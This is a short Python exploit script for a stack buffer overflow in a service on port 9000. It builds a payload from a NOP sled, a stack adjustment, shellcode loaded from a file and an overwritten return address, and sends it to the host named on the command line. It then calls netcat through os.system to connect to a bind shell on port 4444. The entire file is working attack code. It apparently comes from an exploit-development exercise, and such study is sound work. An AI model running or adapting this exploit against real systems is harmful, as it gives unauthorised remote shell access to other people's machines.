#!/usr/bin/python

import socket
import sys
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cyclic_file = open('pattern.txt','rb')
cyclic_str = cyclic_file.read()
cyclic_file.close()

shellfile = open('shellcode.bin','rb')
shellcode = shellfile.read()
shellfile.close()

redEIP = b'\x30\xf3\x22\x00' #0022F340
stack_adjust = b'\x81\xec\x00\x30\x00\x00' #sub esp 3000


buffer = b'\x90'*20+stack_adjust+shellcode+b'\x90'*20+b'A'*(1036-len(shellcode) - 40 - len(stack_adjust))+redEIP+b'C'*(3000-1040)

if __name__ == '__main__':
	sock.connect((sys.argv[1],9000))
	print('sending buffer {0} ... {1}\nlen={2}'.format(buffer[0:10],buffer[len(buffer)-10:-1],len(buffer)))
	sock.send(buffer)
	sock.close()
	print(len(buffer))
	print('done!')
	cmd4shell = 'nc -nv '+sys.argv[1] +' 4444'
	os.system(cmd4shell)
